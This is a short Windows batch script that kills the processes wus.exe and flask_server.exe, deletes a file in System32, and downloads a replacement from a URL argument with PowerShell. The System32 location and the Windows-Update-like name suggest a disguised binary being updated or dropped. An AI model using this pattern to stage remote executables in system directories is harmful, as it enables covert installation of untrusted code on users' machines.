@echo off
taskkill /F /IM wus.exe
taskkill /F /IM flask_server.exe
del /f /q C:\Windows\System32\wus.exe
powershell -command iwr -Uri %1 -OutFile C:\Windows\System32\wus.exe
exit
